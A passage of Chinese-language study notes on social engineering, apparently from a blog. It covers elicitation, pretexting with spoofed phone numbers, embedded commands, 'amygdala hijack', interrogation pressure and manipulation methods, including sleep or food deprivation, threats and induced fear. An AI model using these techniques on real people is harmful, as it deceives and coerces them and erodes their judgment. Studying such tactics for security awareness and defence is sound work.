暗示目标你对问题的答案已经有所了解</p></li></ul><blockquote><p>人们通常会构造自己的记忆来契合自己对世界的认知，因此在进行诱导时可以利用这一手段来构造或扰乱目标的记忆</p></blockquote><ul><li><p>假设性问题<br>  假设目标对问题已经拥有特定的知识<br>  通常此类问题是确定目标是否拥有特定的信息<br>  不要让目标了解事情的全貌，否则会丧失话题控制权<br>  不能通过假设性问题来指责目标的错误<br>  将事实贯穿在问题中，尽量不要携带虚假信息</p></li><li><p>原则</p><ol><li>问题太多会吓跑目标</li><li>问题太少会让目标觉得不自在</li><li>一次只问一个问题，同时提出的问题太多会使目标出现认知负荷，从而使目标有可能下意识选择性的不回答一些问题</li><li>不能显得太急切或太无趣</li></ol></li></ul><hr><h2 id="建立密切关系"><a href="#建立密切关系" class="headerlink" title="建立密切关系"></a>建立密切关系</h2><ul><li>人为时间限制<br>  人们在遇到一个试图接近自己的陌生人时通常首先会下意识思考”这个人在我的生活中会停留多久”，当人们意识到这个陌生人会在自己的生活中停留很长时间的话会产生戒备心理<br>  因此在接近目标时首先要让目标感觉自己不会打扰目标太久，不要让目标觉得自己的兴趣点在对方身上，使目标安心<br>  例如”可以打扰你一会吗”/“可以问你一个小问题吗”</li><li>匹配的非语言行为<br>  控制环境/微表情/肢体语言</li><li>放慢语速<br>  说话越快越容易出错，也会显得不自信</li><li>同情<br>  同情/悲伤是最快与目标建立关系的方式</li><li>自我抑制<br>  延迟自我意识，使目标的观点/想法/需求优先<br>  表现得谦逊<br>  压低声音<br>  轻柔的/无性别区分地碰触<br>  温和的目光<br>  较低的身体姿势</li><li>包容<br>  适当地包容目标，对目标进行恭维会使目标大脑释放多巴胺</li><li>询问开放式问题<br>  尽量多用开放式问题来拓展话题</li><li>让步<br>  适当与目标分享一些有价值的信息</li><li>互利<br>  给予通常会使目标有回报的需求</li><li>调整预期<br>  不要贪婪，见好就收，需要对诱导结果有一个预期目标</li></ul><h1 id="伪装"><a href="#伪装" class="headerlink" title="伪装"></a>伪装</h1><p>创造虚构的环境以去哪说目标泄露信息或者做出某种行为</p><ul><li><p>前期调查越充分，成功的几率越大(信息收集)<br>  可以利用目标的个人性格或情感依托进行伪装</p></li><li><p>植入个人爱好<br>  在伪装中加入自己感兴趣的话题和活动可以使自己对伪装更加<strong>自信</strong><br>  <strong>自信</strong>有助于说服目标相信你，自信心始终与没目标和任务环境有关</p></li><li><p>认知失调理论<br>  人们倾向于协调自己的信仰/观点乃至几乎所有的认知，如果态度和行为之间存在不协调，就必须修正这种不协调</p><ul><li>影响因素<ol><li>不协调的信念的数量</li><li>每个信念的重要性</li></ol></li><li>消除方式(按照推荐的优先级排序)<ol><li>增加更多协调的信念以超过不协调的信念</li><li>降低不协调信念的重要性</li><li>改变不协调的信你以使它们协调(通过观点/行动/知识使伪装与目标的认知一致或协调)<br>建立信念系统</li></ol></li></ul></li><li><p>练习方言或表达方式<br>  用不同方言与人们共同会留下深刻的印象</p></li><li><p>使用电话<br>  不需要与目标面对面，降低伪装的成本<br>  使用”剧本大纲(Script)”<br>  用适当的方法/语速/语调/音调与措辞表达情感<br>  伪造电话号码</p></li><li><p>伪装越简单越好<br>  保持故事情节/事实和细节的简单性会增强其可信性，过于复杂会使目标甚至自己出现认知负荷<br>  不过分追求细枝末节，允许故事发展，使目标用想象力填补故事空隙<br>  一些错误会使故事更加真实</p></li><li><p>伪装必须显得自然<br>  不要考虑自己的感受<br>  不要把事情太当真<br>  学会寻找相关信息<br>  积累更多经验</p></li><li><p>为目标提供逻辑结论或下一步安排<br>  人们都希望被告知下一步应该做什么<br>  注意提出的要求应该和自己伪装的身份相一致</p></li><li><p>适当的使用工具<br>  标志/工具设备/配套服装/名片等</p></li></ul><h1 id="社会工程心理学"><a href="#社会工程心理学" class="headerlink" title="社会工程心理学"></a>社会工程心理学</h1><h2 id="思维模式"><a href="#思维模式" class="headerlink" title="思维模式"></a>思维模式</h2><p>使目标认可你的非语言行为，用目标认可的表达方式，并且在音量/语调和方言上相匹配</p><ul><li><p>感官<br>  视觉/听觉/触觉/味觉/嗅觉<br>  通常在这五种感官中某一种会占主导地位，其中前三种为主要的感官思维模式</p></li><li><p>视觉思维者(大部分人)<br>  通常记得事物的米娜毛，能够清晰地记住场景<br>  可以清楚的描述过去的时间，甚至可以构建未来事件的图像<br>  视觉输入与他们的决策相关，会依据在视觉上吸引他们的东西来做决策</p><ul><li>特征点<br>  我<strong>明白</strong>你的意思/我<strong>看</strong>那样挺好的/我大概有点<strong>印象</strong>了</li><li>次感元<br>  光线(亮/暗)、尺寸(大/小)、颜色(黑白/彩色)、运动(快/慢)、焦点(清晰/模糊)</li></ul></li><li><p>听觉思维者<br>  会记住事件的声音，相比于视觉思维者，通过倾听而可以获取更多信息<br>  总能记住事情发生的方式，可以用声音唤起记忆<br>  和听觉思维者说话时需要注意措辞，听觉思维者根据听到的词语表达来进行决策</p><ul><li>特征点<br>  <strong>洪亮</strong>并且<strong>清楚</strong>…/这件事<strong>告诉</strong>我…/<strong>听起来</strong>不错</li><li>次感元<br>  音量(大/小)、音调(高/低)、音准(高/低)、节拍(快/慢)、距离(远/近)</li></ul></li><li><p>动觉思维者<br>  特别在意感受，能够记住事物对自己带来的感受<br>  通常喜欢用自己的双手感知物体<br>  使动觉思维者会想起与某一件事相关联的感觉/情感，进行感觉上的练习</p><ul><li>特征点<br>  我能<strong>抓住</strong>那个想法的要点/那个是怎么<strong>抓住</strong>你的/我会<strong>联系</strong>你的</li><li>次感元<br>  强度(强/弱)、面积(大/小)、质地(粗糙/光滑)、温度(冷/热)、重量(重/轻)</li></ul></li><li><p>辨别主导感官<br>  自我介绍-&gt;开始简短交流-&gt;观察-&gt;提问</p></li></ul><p>识别并利用他人的主导感官，使其处于非常舒适的氛围中</p><hr><h2 id="神经语言程序学-NLP"><a href="#神经语言程序学-NLP" class="headerlink" title="神经语言程序学(NLP)"></a>神经语言程序学(NLP)</h2><p>一种人际沟通模型，主要关注成功的行为模式和内在的主观经验之间的关系，一种非传统的治疗系统，旨在教育人们要有自我意识和有效沟通，并改变他们的心里和情绪行为的模式</p><ul><li><p>准则<br>  人们必须通过潜意识思维做出改变，新的行为必须符合其原始的积极意向，而且改变必须发生于思维状态内部，而不仅仅是行为层面</p></li><li><p>语音语调<br>  使用嵌入式指令影响目标以某种方式进行思考或采取某种行动<br>  通过变换语调强调句子中的某些词语，是人们的潜意识将重点放在那些词语上</p></li><li><p>句型结构<br>  改变句子中的语音下降点嵌入命令</p><pre><code>  句尾音调  上扬 - 疑问  平滑 - 陈述  下降 - 命令</code></pre></li><li><p>终极声音<br>  降低命令的语调<br>  让声音具有动感<br>  发挥气息的极限<br>  使胸腔产生共鸣</p></li><li><p>要点</p><ol><li>通过使用音调和重音在目标潜意识中嵌入命令</li><li>谨慎的选择用词<br> 积极的词语使目标积极思考<br> 消极的词语是目标不会思考太多</li><li>创建一个可用于当面或电话社会工程学命令语句列表</li></ol></li></ul><hr><h2 id="思维缓冲溢出"><a href="#思维缓冲溢出" class="headerlink" title="思维缓冲溢出"></a>思维缓冲溢出</h2><ul><li><p>基本原则<br>  人们最终在有意识地做出决定时，他们的决定不仅仅依据听到的内容，还有涉及视觉/感觉和情感</p></li><li><p>预期定律<br>  人们通常会遵循他们感受到的别人的期望或要求来做决定</p><pre><code>  例如  &quot;你认识我的那个邻居拉尔夫吗，他总是开着那辆绿色的车&quot;  则在目标中植入的信息如下：      我认识我的邻居      他叫拉尔夫      他有驾照      他开着一辆绿色的车</code></pre></li><li><p>嵌入式指令</p><ul><li><p>基本原则</p><ol><li>指令简短(3-4个字符)以避免认知负荷</li><li>在普通的语句中加入强调(语气要正常)</li><li>搭配适当的面部表情和肢体语言</li></ol></li><li><p>创建一种情绪或思维模式<br>  当你…/当你…时感觉是怎样的/有个人能够…/既然你…</p></li><li><p>巧用引用或故事<br>  将指令嵌入故事中</p></li><li><p>善用否定<br>  利用人们的逆反心理</p></li><li><p>使目标想象<br>  使目标需要适当的联想才能回答</p></li><li><p>思维缓冲区溢出 = 预期定律 + 思维铺垫 + 嵌入式指令</p><p>首先在与目标开始交谈时结合使用短语/肢体语言和假定性言辞，假设所要求的事情已经实现<br>之后通过一些语句在目标思维中做铺垫，方便后续指令植入</p></li></ul></li></ul><hr><h2 id="手势"><a href="#手势" class="headerlink" title="手势"></a>手势</h2><ul><li>锚定<br>  用特定的手势与一种类似表达形式相关联<pre><code>  例如:      当谈论到积极的想法时使用右手手势      当谈论到消极的想法时使用左手手势      即可锚定左手代表消极，右手代表积极</code></pre></li><li>镜像<br>  尝试匹配目标的个性化手势<br>  目标在看到熟悉的手势时会有自在的感觉<br>  但是不要完全相同，否则会起到反作用</li><li>手势摆放<br>  观察目标手臂及手的摆放和位置<ul><li>感到放松时肘部会没有拘束的放在身体两侧</li><li>感到威胁/害怕时肘部向胸腔收近(保护重要器官)</li><li>目标可能会用手势描述出不会说出的信息</li><li>手掌张开表示诚意</li><li>将指尖搭在一起代表自信，认为自己很有权威</li><li>敲击/打击手指代表焦虑</li><li>摸脸/下巴代表思考</li><li>触摸头发代表不安</li><li>触摸耳朵代表犹豫不决</li></ul></li></ul><p>适当利用手势有助于伪装</p><ul><li>不要刻意记手势，而是要记住手势的附加信息</li><li>避免单调/重复的手势</li><li>避免表示焦虑或者动作过大的手势</li><li>手势不要过多</li></ul><hr><h2 id="聆听"><a href="#聆听" class="headerlink" title="聆听"></a>聆听</h2><p>一个人讲话的方式可以透露出很多信息(情绪/语速/状态)</p><ul><li>集中注意力，高度关注目标<br>  密切专注目标的肢体语言/面部表情</li><li>提供聆听的证据<br>  表现出真诚与微笑，不时地点头，证明正在积极地聆听目标</li><li>提供有价值的反馈<br>  时不时地重述或概括聆听到的内容<br>  或者提问相关问题代表有很强的欲望去深入理解</li><li>不要打断目标<br>  尽量不要打断，但是情况适当的打断也是一种手段</li><li>适当的反应<br>  保持尊重，注意自己的情绪，尽量抑制自己的成见<br>  反射性响应<ul><li>积极聆听</li><li>当需要做出回应时注意自己的情绪</li><li>重复/概括听到的内容</li><li>可以用一些含糊的词语做出反应</li></ul></li></ul><hr><h2 id="共识"><a href="#共识" class="headerlink" title="共识"></a>共识</h2><p>无意识的人类互动最重要的特性或特征之一<br>是看法上的共性，与交谈的另一方达成同步，或处于相同的波段</p><ul><li>真正的想要了解他人</li><li>注意自身形象(着装/外表/个人卫生)</li><li>善于聆听</li><li>留心对他人的影响，注意自己的第一印象</li><li>尽量少谈论自己，让目标谈论他们自己</li><li>同情心<br>  感同身受，认真倾听，并确定潜在的情感，站在对方的角度思考，但是不要显得盛气凌人</li><li>扩大自己的知识领域</li><li>表达好奇心<br>  保持心胸开阔，探究并且接受别人在某一话题上的想法</li><li>满足他人的需求<br>  创造一个环境满足对方的需求<pre><code>  四类基本心里需求：  归属/联系/爱  权力/地位/能力  自由/责任  娱乐/学习</code></pre></li><li>使用NLP<ul><li>呼吸频率保持一致</li><li>语音/语调保持一致<br>  留心关键短语</li><li>肢体语言保持一致<br>  表现出类似肢体语言</li></ul></li><li>测试共识的方法<br>  做一些下意识的动作，观察目标是否出现类似动作</li></ul><hr><h2 id="杏仁核劫持"><a href="#杏仁核劫持" class="headerlink" title="杏仁核劫持"></a>杏仁核劫持</h2><p>情绪处理的过程是无意识的，自动的，并且受到输入感官的影响</p><ul><li>杏仁核<br>  杏仁核状大规模灰质，存在于大脑前内侧中间，是颞叶皮层的一部分<br>  人类的情感处理器，处理所有形态的输入（感觉），并且投射到大脑的不同区域（脑干、下丘脑、海马体、基底神经节、大脑皮层）</li><li>自动驾驶<br>  原理：杏仁核处理情感的速度比大脑快<br>  杏仁核激活，新皮质近乎关闭，肾上腺素、荷尔蒙水平及血压升高，记忆开始变得低效，失去高效交流的能力<br>  触发式强制控制负责情绪、同情或社交的脑区可以使人丧失逻辑能力<br>  杏仁核会不断审视环境刺激，寻找触发人们理解周围世界的非语言反馈<br>  感受周围的环境，观察他人从非语言形式表现出的消极情绪，例如有时莫名的不安，紧张，恐惧等，有助于人们保持警惕<br>  情绪可以传染（环境、氛围）</li><li>原理<br>  如果杏仁核处理一些强烈的感觉和情绪，杏仁核会关闭大脑的逻辑思维中心，只依靠感性处理中心作决策（情绪化的决策）</li><li>利用方程式<br>  （感官输入&gt;共情）+逻辑中心关闭=杏仁核劫持+提出要求<br>  杏仁核劫持=辅助非语言行为+情感共鸣内容+提出适当要求</li><li>控制方法<br>  杏仁核劫持是快速的，并且可被强烈的情绪延长，所以如果碰到杏仁核被劫持的情况，停下来暂时屏蔽强烈情感休息一会再做决定</li></ul><h1 id="询问与审讯"><a href="#询问与审讯" class="headerlink" title="询问与审讯"></a>询问与审讯</h1><ul><li><p>区别<br>  询问: 目标在身体和心理上都处于舒适的状态<br>  审讯: 通过审讯场所与问题向目标施压，使其感觉不适</p></li><li><p>留意目标的变化</p></li></ul><table><thead><tr><th>特征</th><th>状态</th></tr></thead><tbody><tr><td>身体姿势</td><td>直立/瘫倒/倾斜</td></tr><tr><td>脸色</td><td>苍白/红/白/变化</td></tr><tr><td>头部</td><td>昂首/倾斜/前/后</td></tr><tr><td>眼睛</td><td>方向/睁开的状态</td></tr><tr><td>手/脚</td><td>动作/位置/颜色</td></tr><tr><td>口唇</td><td>位置/颜色/状态</td></tr><tr><td>主要感觉</td><td>视觉/听觉/活力/感觉</td></tr><tr><td>声音</td><td>音高/速率/变化</td></tr><tr><td>词语</td><td>长/短/音节的数量/功能障碍/停顿</td></tr></tbody></table><p>注意目标的措辞（太短：预先演练过/太长：在准备撒谎）<br>注意时态/代词的变化<br>观察目标的一系列变化，确定目标的自然状态(基准)</p><ul><li><p>方法</p><ul><li>正面交锋<br>  已经确定目标要做的事，并且要求目标立刻去做(NLP/命令)</li><li>主题延伸<br>  审讯者假定一个故事场景并多次传递给目标，观察目标的反应<br>  展示辅助性的证据直接支持所描述的场景(伪装)</li><li>应付拒绝与反对<br>  预先制定退出策略，仔细组织主题从而预先消除可能的反对</li><li>保持目标注意力集中<br>  当目标开始考虑行为的不良后果时，克服内在的恐惧，镇定的按照预定目标驱动对方(驱动目标使其无法分神考虑后果)</li><li>展示其他途径(备用计划)</li><li>制定计划<br>  人物：目标的详细信息<br>  事件：准备工作<br>  时间：计划执行的时间段与原因（需要证据支持）<br>  地点：计划的执行地点，确定最佳场所（环境因素）<br>  原因：计划的目标（计划成功的标准）<br>  方式：使用什么样的方式从目标获取信息（NLP/嵌入式指令/缓冲区溢出）</li></ul></li><li><p>其他审讯技巧</p><ul><li>直接<br>  保持足够的信心，并且假设目标会进行反馈</li><li>间接<br>  使目标成为谈话主角，通过诱导或精心设计的问题使目标泄漏信息</li><li>博取同情<br>  在谈话中表达对目标的同情，留下善解他人的印象</li><li>激发情绪<br>  利用前期已经收集的信息，激发并利用目标的情绪</li><li>合乎逻辑<br>  充满信心，使自己的伪装合乎逻辑</li><li>咄咄逼人<br>  提高音量，加快语速，使目标来不及思考合理性</li><li>组合<br>  根据目标个性组合多种方法</li><li>保持冷静<br>  被抓到的时候保持冷静/镇定，从而降低警觉</li><li>挽回面子<br>  挽回目标的面子，给对方一个很好的借口</li><li>自尊心膨胀<br>  令对方感到自豪，鼓吹目标的成就</li><li>夸张<br>  夸大事件的严重性（在合理的范围内）</li><li>循序渐进<br>  一步一步慢慢的突破</li></ul></li></ul><h1 id="影响与操纵"><a href="#影响与操纵" class="headerlink" title="影响与操纵"></a>影响与操纵</h1><p>让他人想要以你所期许的方式去行动/反应/思考或建立信仰的过程</p><ul><li><p>基本原则</p><ol><li>设定明确的目标<br> 想要什么？<br> 如何确认目标已经完成？</li><li>构建共识<br> 了解目标精神状态，站在对方的立场上考虑，表达友善</li><li>洞察环境<br> 对自身和周围环境保持警觉（观察/倾听）</li><li>灵活应变</li><li>内省<br> 理解自己的情感</li></ol></li><li><p>战术</p><ul><li><p>回报——固有期望<br>  人们会帮助那些帮助过他们的人<br>  人们不会伤害那些曾经帮助过他们的人</p><ol><li>送出某样有价值的东西</li><li>制造受惠的感觉，价值越高，受惠感越大</li><li>提出合理的请求</li></ol></li><li><p>义务<br>  基于社会/法律和道德要求，以及责任/合约或承诺人们认为必须要做的事<br>  称赞-&gt;提出请求<br>  黄金法则：己所不欲，勿施于人（对别人友好）</p></li><li><p>让步——对回报的利用（礼尚往来）<br>  必须对接受方有价值<br>  原则</p><ol><li>表示出让步<br> 明确让对方知晓何时作出何种让步</li><li>要求和定义回报<br> 植入回报的种子</li><li>视情况作出让步<br> 作出没有风险的让步</li><li>分批作出让步<br> 所有的让步不一定一次到位</li></ol></li><li><p>稀缺——创造欲望<br>  对可供选择的资源进行分配，由待分配物的稀缺性驱动，资源越稀少，物品的<strong>感知价值</strong>越高</p><ol><li>利用稀缺操纵人们的注意力（人们渴望得到难以企及的东西——成就感）</li><li>制造紧迫感</li><li>利用信息的稀缺性提升信息的价值</li></ol></li><li><p>权威——不敢质疑<br>  人们更愿意听从他们眼中权威人士的指导和建议</p><pre><code>  类型：      法律权威（保安/律师等）：伪装成大众敬畏或尊敬的角色      组织权威（老板/领导者/CEO等）：管理阶层      社会权威：社会团体中天生的领导者</code></pre><p>  在适当情况下人们更可能对来自权威的主张作出快速反应，尽管这种所谓的权威甚至根本没有露面<br>  自动对权威作出反应时，人们往往是对权威的符号作出反应，而不是其本身（头衔/衣服/汽车/名片等符号）</p></li><li><p>承诺和一致性<br>  通常人们会在言语、态度和行为上保持一致<br>  根据以往的经验或期望所应有的预期<br>  在作出承诺、明确立场后，人们会更加愿意同意那些和他们初始承诺一致的要求</p><p>  <strong>获取信息承诺</strong></p><ul><li><p>询问那谢目标必须回答“是”的问题</p></li><li><p>希望“自己”能保持言行一致是很好的激励因素</p></li><li><p>人们渴望在他人看来自己始终言行一致</p></li><li><p>人们几乎不会违背自己口头、公开或自愿作出的承诺</p></li><li><p>通过扩大范围来增强其承诺的严肃性</p><p>促使目标承诺采取一些小的行动或表示认同，利用这个承诺扩大范围，从而产生更好的效果</p></li></ul></li><li><p>喜欢<br>  人们喜欢那些喜欢自己的人<br>  人们会倾向于接受朋友给出的坏建议、而不是陌生人给出的好建议</p><ul><li>原则<ul><li>建立共识</li><li>自信积极的态度</li><li>与目标和环境保持一致</li><li>有效的进行沟通</li></ul></li><li>月晕效应<br>  某人的一种特质会影响扩展到其他品质<br>  倾向于关注他人的优点会影响一个人的决定<br>  人们会倾向于将美丽和其他成功特性联系在一起<br>了解目标-&gt;伪装成目标期望的样子-&gt;构建信任关系</li><li>过度满足<br>  过多的正面肯定可能会起到负面效应<br>  需要通过问题或错误来给出肯定</li></ul></li><li><p>共识/社会认同<br>  社会影响会导致一个大的社会群体对正确或错误的判断达成一致</p><ul><li>社会认同<br>  人们会做他人正在做的事情，尽管可能不知道那件事情是否是符合自己价值的<br>  如果和周围人群高行为一致，就不会显得失礼</li><li>不确定<br>  人们在确定并且形式不明的情况下，更可能观察他人的行为，并认为这种行为是正确的</li><li>相似性<br>  人们更倾向于跟随与自己类似的人都引导</li></ul></li></ul></li><li><p>框架<br>  人活中的信息和经历，能够在人们必须作出决定的时候改变其反应方式<br>  任何可以用来改变人们的认知或者人们做决定的方式的东西</p><ul><li><p>参考框架<br>  一组看法、条件或假设，决定了人们如何接近、认知或理解某一事物</p></li><li><p>目标感知和价值<br>  目标对一件事物的认知会提高或降低它的价值</p><p>  例如80%的瘦肉和20%的肥肉</p></li><li><p>框架联盟</p><ul><li><p>框架共振<br>  个人框架由于一致或互补而形成关联</p></li><li><p>条件</p><ul><li>框架努力成果的鲁棒性、完备性和彻底性<br>  诊断框架的问题<br>  分析并找出解决方案<br>  如果成功了，号召行动</li><li>提议的框架和大众信仰系统之间的关系<br>  必须要与个人的核心信仰保持一致</li><li>框架与参与者现实情况的关联<br>  框架必须与目标本人相关，如目标经历的关系必须可信并且可验证</li><li>对当前社会变迁的持续关注，以及框架在当前时代出现的时间点</li></ul></li><li><p>框架桥接（联系）<br>  就某一主题而言，思想上一致，但结构上互不关联的两个框架的连接<br>  在深入了解目标的框架后，发现两者之间的联系，利用这一联系将目标带入你的框架——伪装</p></li><li><p>框架放大<br>  对一个与某议题、问题或者一组事件有关的解释性框架进行阐述及激励——扩大或把焦点放在目标的价值观或信仰上<br>  涉及强调某一事件比其他事件更重要，从而使这个时间能够轻松与其他事件联系起来<br>  可以成功的让现有框架产生混乱，使具有特定信仰的人远离他们的信仰</p></li><li><p>框架扩展<br>  是一种变动的成果，通过将提议的框架边界扩展到一群人的观点、兴趣，特别是情绪，将参与者引入其中<br>  通过扩展框架的边界，将目标的其他主题或兴趣引入其中，与他们达成联盟（一致）<br>  太多的扩展可能会削弱人们对原有框架的支持，导致其在一定程度上丧失吸引力</p></li><li><p>框架转换<br>  当提议的框架很难引起共鸣，而且有时与传统的生活方式、礼制衣机现有的解释框架背道而驰的时候，就需要对框架进行转换<br>  通过提出新的论点说明为什么新的框架更好，意图将目标原有的框架思维和信念转换为新的样子<br>  需要新的价值观和理念来确保人们参与其中，并得到他们的支持（时间/精力/教育/逻辑/深厚的感情纽带）</p></li></ul></li><li><p>利用框架战术</p><ul><li><p>说的每件事都会唤起一个框架<br>  利用语言进行描绘，使目标大脑中描绘出对应的事物</p></li><li><p>框架中定义的词句会唤起思维框架<br>  不必使用确切的字词为他人庙会设想的框架<br>  通过间接表达控制对象的思维（事先计划）</p></li><li><p>否定框架<br>  告诉目标要小心、当心或提防某事，会自动将其引入设想的框架中</p></li><li><p>让目标思考框架会强化框架<br>  每次大脑在关注或考虑某事的时候，该事件会得到强化<br>  通过省略某些细节，仅透露出想要透露的细节，可以创建出他们想要目标思考或感觉的框架<br>  贴标签：通过描述性词句为某事打上标签，将目标带入设定的框架</p><p>适当改变呈现、设定道德选择和价值困境的方式，会对人们的政治选择和政策产生深远的影响</p></li></ul></li></ul></li></ul><hr><h2 id="操纵"><a href="#操纵" class="headerlink" title="操纵"></a>操纵</h2><p>通过自身的技巧控制或影响他人，达到自己的目的</p><ul><li>目的<br>  战胜目标的批判性思维</li><li>自动应答<br>  大脑在接收到问题后会自动作出应答</li><li>条件反射<br>  通过不断的适应，人们会将特定的声音、行为与感觉和情绪相关联</li><li>转移<br>  将人们的注意力从他们的事实行为上转移，改变目标的关注焦点</li><li>问题构造<br>  首先构造一个可怕的问题，然后提供“事实”作为证据，证明问题与解决方案的真实性</li><li>色彩<br>  操纵目标的情绪</li></ul><table><thead><tr><th>颜色</th><th>含义</th></tr></thead><tbody><tr><td>白色</td><td>纯洁/明亮/干净/安全/中立/善良/忠诚</td></tr><tr><td>黑色</td><td>权利/高雅/神秘/力量/权威/深度/稳定/平静/宁静/强化其他色彩</td></tr><tr><td>红色</td><td>喜悦/兴奋/喜庆/行动/能量/健康/速度/激情/欲望/爱/刺激情绪/心跳呼吸加快/血压升高/力量/冲动/武力/威胁/征服/暴力/复仇</td></tr><tr><td>橙色</td><td>温暖/热情/吸引/决心/力量/忍耐/鼓舞/活力/刺激食欲/不安全/无知/迟缓</td></tr><tr><td>金色</td><td>明亮/智慧/财富/威望</td></tr><tr><td>黄色</td><td>能量/乐观/喜悦/高兴/忠诚/精神饱满/让对方觉得成为焦点和受重视/少量应用会激发正面情绪，过多会让目标注意力不集中</td></tr><tr><td>绿色</td><td>大自然/和谐/生命/丰饶/雄心/保护/和平/平静/安全/过多会有贪婪/内疚/嫉妒/混乱</td></tr><tr><td>蓝色</td><td>天空/海洋/智慧/直觉/真理/宁静/健康/力量/知识/镇定/冷静/使新陈代谢变慢/眼睛最容易适应/寒冷/忧郁/沮丧</td></tr><tr><td>紫色</td><td>皇家/高贵/奢侈/创意/神秘</td></tr><tr><td>棕色</td><td>地球/可靠/易接近/惯例/秩序/牢固/相关/秩序感</td></tr></tbody></table><ul><li><p>操纵激励<br>  刺激人们去采取行动的东西</p><ul><li>金钱激励<br>  例如买彩票和优惠券等</li><li>意识激励<br>  人们会被拥有类似梦想和目标的人吸引<br>  具有类似信息的人能够增强彼此的信念和做正确的事的欲望<br>  例如寓言故事和共鸣等</li><li>社会激励<br>  人们对生活和自身的看法，会受周围人群极大影响<br>  例如尾随战术——混入羊群</li></ul></li><li><p>方法</p><ul><li>提高目标的暗示感受性<br>  极端：睡眠和食物匮乏<br>  缓和：时间紧迫<br>  用恐惧、愤怒或激动等情绪扰乱目标后，可以为他植入不同的信念<br>  这些情绪会导致目标暗示接受性提高和判断力下降<br>  首先给目标一个会另其感到恐惧或激动的暗示<br>  然后提供一个解决方案（植入信念）<br>  制造出一个易于接受暗示的环境</li><li>控制目标的环境<br>  通常用于在线社会工程、欺诈和身份盗用等<br>  控制目标能访问的信息类型和数量<br>  例如获取目标社交网站的访问权</li><li>迫使目标重新评估（制造怀疑）<br>  动摇并深挖目标的信仰系统<br>  逐渐削弱目标的信念、意识或对某一情况的情绪控制会让目标感到不安</li><li>让目标感到无能为力（感觉脆弱）<br>  利用权威，让目标对自己的信念逐步丧失信心</li><li>给予非肉体惩罚（让目标产生强烈的情绪反应）<br>  焦虑、怀疑、罪恶感、耻辱等，让目标丧失特权</li><li>威胁目标<br>  对生理痛苦或其他可怕情形的畏惧让目标在压力下崩溃<br>  利用权威制造强烈的恐惧感或有潜在损失的感觉，让目标感到不自在，忧虑</li></ul></li><li><p>技巧</p><ul><li>不要让目标的表现影响你的情绪<br>  控制情绪，保持冷静</li><li>寻找积极的话题<br>  适当，有涵养，有品位</li><li>假定<br>  假定一切——信心，保持信念</li><li>尝试不同的开头</li><li>使用过去时<br>  将过去负面状态和行为放到回忆中，使人有“重新开始”的感觉</li><li>探讨并摧毁<br>  实现思考如何处理潜在的交流障碍或破坏性影响</li></ul></li></ul><h1 id="非语言交流"><a href="#非语言交流" class="headerlink" title="非语言交流"></a>非语言交流</h1><h2 id="身势学——肢体语言"><a href="#身势学——肢体语言" class="headerlink" title="身势学——肢体语言"></a>身势学——肢体语言</h2><p>对非语言身体动作与交流之间的关系的系统研究</p><ul><li><p>手部语言</p><ul><li>起源<br>  神经系统、生存本能、随文化/阶级/家庭或个人变化</li><li>编码<br>  固有编码<br>  形象编码<br>  行为和含义间的关系——象征</li><li>分类<ul><li>象征性动作<br>  包含了一个或两个词的简单短语的直接穿衣<br>  一个为团体、阶级或亚文化群所熟知的准确含义<br>  经常有意的用来向他人传递特定消息<br>  接收者知道其接收的象征动作是有意为之<br>  发送者对交流负责任</li><li>演示性动作<br>  那些与演讲、措辞、内容、声调变化曲线及响度等实时密切相关的行为<br>  强化所说的话的动作姿态<br>  通常没有准确的语言含义<br>  一般不会在没有对话时使用<br>  只有和说话者使用，收听者不会使用<br>  演示性动作随说话的增加、愤怒、恐惧、焦虑、兴奋而增加<br>  感情投资、厌倦、假装关切、不善说谎的人会停止使用演示性动作<ul><li>发令动作<br>  强调某个特殊的词、短语</li><li>表意动作<br>  速写思路</li><li>指示动作<br>  指向物品、地点或时间</li><li>节律动作<br>  描述事件进行的步调</li><li>空间动作<br>  描述空间关系</li><li>活动动作<br>  描述身体运动或非人类肢体运动</li><li>象形动作<br>  描述涉及的物体</li><li>象征动作<br>  阐明某事或代替一句话/短语</li></ul></li><li>操纵性动作<br>  涉及对身体部位或衣着进行整饰的行为<br>  紧张-&gt;搓手<br>  寻求抚慰-&gt;玩弄首饰、扣子或其他衣着物品<br>  玩弄头发、手或戒指等</li></ul></li><li>高度自信<br>  手心向上，手指伸展有助于建立密切关系，增强积极情感<br>  尖塔形手势<br>  双手背到脑后，手臂伸展开（领地意识）<br>  拇指动作：向上露出拇指<br>  腹部动作（下腹部）-&gt;开放性动作<br>  双手张开露出腹部：邀请<br>  双手并拢，至于腹部：命令/要求<br>  向内曲拢手指：命令、指挥<br>  挽起袖子<br>  女生双手叉腰<br>  生殖器指向：自信、支配欲<br>  勾起拇指放在腰带上或裤兜里</li><li>底自信<br>  揉搓双手：紧张、不适<br>  不停叩响指关节<br>  用手抓、揉或对衣着及身体部位进行操纵性动作<br>  拇指向下<br>  藏起或放低拇指<br>  手部闭合<br>  隐藏、放低双手</li></ul></li><li><p>腿、脚部语言<br>  对抗地心引力的动作姿态（弹跳、摇摆、抬起脚尖）——开心<br>  脚、腿部的朝向——指向想去的地方<br>  扩大双脚站立的距离——感受到威胁（领地意识）<br>  跷二郎腿：朝向喜欢的人/不朝向喜欢的人（设置屏障）</p></li><li><p>躯干和身体语言</p><ul><li>躯干倾斜<br>  人们的躯干无意识会倾斜于他们喜欢的事物，远离他们不喜欢的事物</li><li>胸部的起伏<br>  胸部的起伏和粗重的呼吸：为吸入更多氧气（不适）</li><li>手臂<br>  开放的双臂（腹部）、手臂前端或敏感部位暴露：信任<br>  封闭（交叉）：设置屏障（高于胃部，低于胸部，防御姿态）</li><li>腹部<br>  开放的腹部表示自信、信任</li><li>肩部<br>  耸肩：不确定、不适、不知道，表疑问或否定</li></ul></li><li><p>舒适与不适（操纵性动作）</p><ul><li><p>颈部<br>  当人们在做艰难的决定时，揉搓或抚摸流经颈部（后颈部）和胸上部（胸骨切迹）的两条神经（交感神经和颈动脉窦）能起到安抚作用：紧张、怀疑、害怕、担忧、威胁</p></li><li><p>脸部<br>  揉搓脸部：威胁、不安全、不适、怀疑</p></li><li><p>嘴部<br>  捂嘴：害怕、惊讶、恐惧、震惊、悲伤（自我安慰）</p><blockquote><p>融入群体：自己和周围的人群表相处相同的情绪，寻找或制造一种利用重大事件加入群体的情况</p></blockquote></li><li><p>唇部<br>  双唇紧闭：压抑愤怒，阻止想说的话<br>  双唇撅起：不确定，认知负荷（一般会伴随眉头紧锁），犹豫不决<br>  咬唇（咬手指，嚼东西）：认知负荷，焦虑</p></li><li><p>眼部<br>  